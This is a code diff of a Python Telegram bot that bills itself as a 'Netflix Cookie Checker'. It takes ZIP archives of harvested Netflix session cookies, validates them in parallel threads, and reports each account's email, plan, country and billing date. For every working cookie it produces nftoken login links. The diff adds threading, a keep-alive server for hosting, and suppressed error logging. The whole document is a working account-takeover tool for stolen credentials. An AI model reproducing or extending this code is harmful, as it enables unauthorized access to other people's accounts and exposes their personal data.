@@ -10,10 +10,40 @@ import requests
 import urllib.parse
 from datetime import datetime
 from threading import Lock
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ============ FIX FOR PYTHON 3.14 ============
+# ============ KEEP ALIVE SERVER FOR RENDER ============
+try:
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    import threading
+    
+    class KeepAliveHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"Bot is running!")
+        
+        def log_message(self, format, *args):
+            pass  # Suppress logs
+    
+    def run_keep_alive():
+        try:
+            port = int(os.environ.get("PORT", 10000))
+            server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
+            server.serve_forever()
+        except:
+            pass
+    
+    # Start keep-alive server in background
+    keep_alive_thread = threading.Thread(target=run_keep_alive, daemon=True)
+    keep_alive_thread.start()
+    print("✅ Keep-alive server started")
+except Exception as e:
+    print(f"⚠️ Keep-alive server not started: {e}")
+
+# ============ FIX FOR PYTHON EVENT LOOP ============
 try:
     asyncio.get_running_loop()
 except RuntimeError:
@@ -27,7 +57,7 @@ try:
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 except Exception as e:
-    print(f"Telegram import error: {e}")
+    print(f"❌ Telegram import error: {e}")
     sys.exit(1)
 
 # ============ NETFLIX CONFIGURATION ============
@@ -88,8 +118,13 @@ COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
 REQUIRED_COOKIE = "NetflixId"
 
 # ============ BOT CONFIGURATION ============
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+if not BOT_TOKEN:
+    print("❌ BOT_TOKEN environment variable not set!")
+    sys.exit(1)
+
 MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
+MAX_THREADS = 5  # 5 Threads for speed
 
 # ============ COUNTERS ============
 class Counters:
@@ -358,6 +393,75 @@ def find_txt_files(folder_path):
         pass
     return txt_files
 
+# ============ PROCESS COOKIE WITH THREADS ============
+def process_cookie_file(file_path):
+    try:
+        cookie_dict = extract_cookies_from_file(file_path)
+        
+        if not is_valid_cookie(cookie_dict):
+            return None
+        
+        account_info = get_account_info(cookie_dict)
+        if not account_info or account_info["status"] == "Unknown":
+            return None
+        
+        account_info["email"] = fix_email_display(account_info["email"])
+        
+        token, expires = get_nftoken_from_cookies(cookie_dict)
+        
+        if not token:
+            return None
+        
+        result = {
+            "email": account_info["email"],
+            "status": account_info["status"],
+            "country": account_info["country"],
+            "plan": account_info["plan"],
+            "plan_type": classify_plan(account_info["plan"]),
+            "maxStreams": account_info["maxStreams"],
+            "memberSince": account_info["memberSince"],
+            "nextBilling": account_info["nextBilling"],
+            "nftoken": token,
+            "expires": expires,
+            "expiry_formatted": format_expiry(expires),
+            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
+            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
+        }
+        
+        return result
+    except Exception as e:
+        return None
+
+def process_cookies_parallel(file_paths, status_callback=None):
+    results = []
+    total = len(file_paths)
+    completed = 0
+    
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        future_to_file = {executor.submit(process_cookie_file, f): f for f in file_paths}
+        
+        for future in as_completed(future_to_file):
+            completed += 1
+            try:
+                result = future.result(timeout=45)
+                if result:
+                    results.append(result)
+                    if result["status"] == "Active":
+                        counters.add_hit()
+                    elif result["status"] == "Canceled":
+                        counters.add_custom()
+                    elif result["status"] == "Free":
+                        counters.add_free()
+                else:
+                    counters.add_bad()
+            except Exception:
+                counters.add_bad()
+            
+            if status_callback:
+                status_callback(completed, total)
+    
+    return results
+
 # ============ MAIN BOT FUNCTIONS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
@@ -371,6 +475,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🎬 **Netflix Cookie Checker Bot**\n\n"
         "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
+        f"⚡ **Using {MAX_THREADS} threads for fast processing**\n"
         "⚠️ **Maximum file size: 5 MB**\n\n"
         "I will check all cookies, extract account info, and generate NFToken links.",
         reply_markup=reply_markup,
@@ -392,7 +497,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Validates cookies\n"
         "• Extracts account information\n"
         "• Generates PC and Phone NFToken links\n"
-        "• Shows each account in a separate message"
+        "• Shows each account in a separate message\n"
+        f"• Uses {MAX_THREADS} threads for speed"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
@@ -408,16 +514,17 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        print(f"Error in help_command: {e}")
+        pass
 
 async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     about_text = (
         "ℹ️ **About Bot**\n\n"
         "Netflix Cookie Checker Bot\n"
         "Checks Netflix cookies and generates NFToken links.\n\n"
-        "🔹 Version: 3.0\n"
+        "🔹 Version: 4.0\n"
         "🔹 Supports: ZIP only\n"
         "🔹 Max file size: 5 MB\n"
+        f"🔹 Threads: {MAX_THREADS}\n"
         "🔹 Each account shown separately\n"
         "🔹 Live statistics during scanning"
     )
@@ -435,7 +542,7 @@ async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        print(f"Error in about_command: {e}")
+        pass
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats_text = (
@@ -460,12 +567,15 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        print(f"Error in stats_command: {e}")
+        pass
 
 async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     counters.reset()
-    await update.callback_query.answer("📊 Statistics reset successfully!", show_alert=True)
-    await stats_command(update, context)
+    if update.callback_query:
+        await update.callback_query.answer("📊 Statistics reset successfully!", show_alert=True)
+        await stats_command(update, context)
+    else:
+        await update.message.reply_text("📊 Statistics have been reset!")
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -503,12 +613,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(
                 "🎬 **Netflix Cookie Checker Bot**\n\n"
                 "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
+                f"⚡ **Using {MAX_THREADS} threads for fast processing**\n"
                 "⚠️ **Maximum file size: 5 MB**",
                 reply_markup=reply_markup,
                 parse_mode="Markdown"
             )
     except Exception as e:
-        print(f"Error in button_callback: {e}")
+        pass
 
 async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, extract_dir, status_msg):
     try:
@@ -530,56 +641,43 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
             )
             return
         
-        results = []
-        total_checked = 0
+        total_files = len(txt_files)
         
-        for txt_file in txt_files:
+        def update_status(completed, total):
             try:
-                result = process_cookie_file(txt_file)
-                total_checked += 1
-                if result:
-                    results.append(result)
-                    if result["status"] == "Active":
-                        counters.add_hit()
-                    elif result["status"] == "Canceled":
-                        counters.add_custom()
-                    elif result["status"] == "Free":
-                        counters.add_free()
-                else:
-                    counters.add_bad()
-                
-                # Update status message with live stats
-                await status_msg.edit_text(
-                    f"⏳ **Processing your file...**\n\n"
-                    f"📁 {total_checked}/{len(txt_files)} files checked\n"
-                    f"📊 {counters.get_stats()}",
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                print(f"Error processing file {txt_file}: {e}")
-                counters.add_bad()
-                continue
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    asyncio.run_coroutine_threadsafe(
+                        status_msg.edit_text(
+                            f"⏳ **Processing your file...**\n\n"
+                            f"📁 {completed}/{total} files checked\n"
+                            f"📊 {counters.get_stats()}",
+                            parse_mode="Markdown"
+                        ),
+                        loop
+                    )
+            except:
+                pass
         
-        # Delete status message
+        results = process_cookies_parallel(txt_files, update_status)
+        
         await status_msg.delete()
         
         if not results:
             await update.message.reply_text(
                 "❌ **No valid accounts found!**\n\n"
-                f"Total files checked: {total_checked}\n\n"
+                f"Total files checked: {total_files}\n\n"
                 f"📊 {counters.get_stats()}",
                 parse_mode="Markdown"
             )
         else:
-            # Send each account as a separate message
             for i, result in enumerate(results, 1):
                 await send_account_message(update, context, result, i, len(results))
             
-            # Send summary with stats
             await update.message.reply_text(
                 f"✅ **Scan Complete!**\n\n"
                 f"📊 Total accounts found: {len(results)}\n"
-                f"📁 Files checked: {total_checked}\n\n"
+                f"📁 Files checked: {total_files}\n\n"
                 f"📊 {counters.get_stats()}",
                 parse_mode="Markdown"
             )
@@ -616,7 +714,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
         
-        # Send status message with initial stats
         status_msg = await update.message.reply_text(
             f"⏳ **Processing your file...**\n\n"
             f"📊 {counters.get_stats()}",
@@ -634,50 +731,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         asyncio.create_task(process_zip_file(update, context, file_path, extract_dir, status_msg))
         
     except Exception as e:
-        print(f"Error in handle_document: {e}")
-        await update.message.reply_text(
-            f"❌ **Error: {str(e)}**",
-            parse_mode="Markdown"
-        )
-
-def process_cookie_file(file_path):
-    try:
-        cookie_dict = extract_cookies_from_file(file_path)
-        
-        if not is_valid_cookie(cookie_dict):
-            return None
-        
-        account_info = get_account_info(cookie_dict)
-        if not account_info or account_info["status"] == "Unknown":
-            return None
-        
-        account_info["email"] = fix_email_display(account_info["email"])
-        
-        token, expires = get_nftoken_from_cookies(cookie_dict)
-        
-        if not token:
-            return None
-        
-        result = {
-            "email": account_info["email"],
-            "status": account_info["status"],
-            "country": account_info["country"],
-            "plan": account_info["plan"],
-            "plan_type": classify_plan(account_info["plan"]),
-            "maxStreams": account_info["maxStreams"],
-            "memberSince": account_info["memberSince"],
-            "nextBilling": account_info["nextBilling"],
-            "nftoken": token,
-            "expires": expires,
-            "expiry_formatted": format_expiry(expires),
-            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
-            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
-        }
-        
-        return result
-    except Exception as e:
-        print(f"Error in process_cookie_file: {e}")
-        return None
+        pass
 
 async def send_account_message(update, context, result, index, total):
     status_emoji = "✅" if "Active" in result["status"] else "❌" if "Canceled" in result["status"] else "🆓"
@@ -744,14 +798,9 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ============ MAIN ============
 def main():
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ Please set BOT_TOKEN environment variable!")
-        return
-    
     try:
         application = Application.builder().token(BOT_TOKEN).build()
         
-        # Add handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("about", about_command))
@@ -762,11 +811,12 @@ def main():
         application.add_error_handler(error_handler)
         
         print("🤖 Netflix Cookie Checker Bot is running...")
-        print("Supported format: ZIP only")
-        print("Max file size: 5 MB")
-        print("Live statistics enabled!")
+        print(f"✅ Using {MAX_THREADS} threads for processing")
+        print("📁 Supported format: ZIP only")
+        print("📦 Max file size: 5 MB")
+        print("📊 Live statistics enabled!")
+        print("🌐 Keep-alive server running for Render")
         
-        # Run the bot
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
@@ -778,9 +828,7 @@ def main():
             loop.close()
             
     except Exception as e:
-        print(f"Error in main: {e}")
-        import traceback
-        traceback.print_exc()
+        print(f"Error: {e}")
 
 if __name__ == "__main__":
     main()
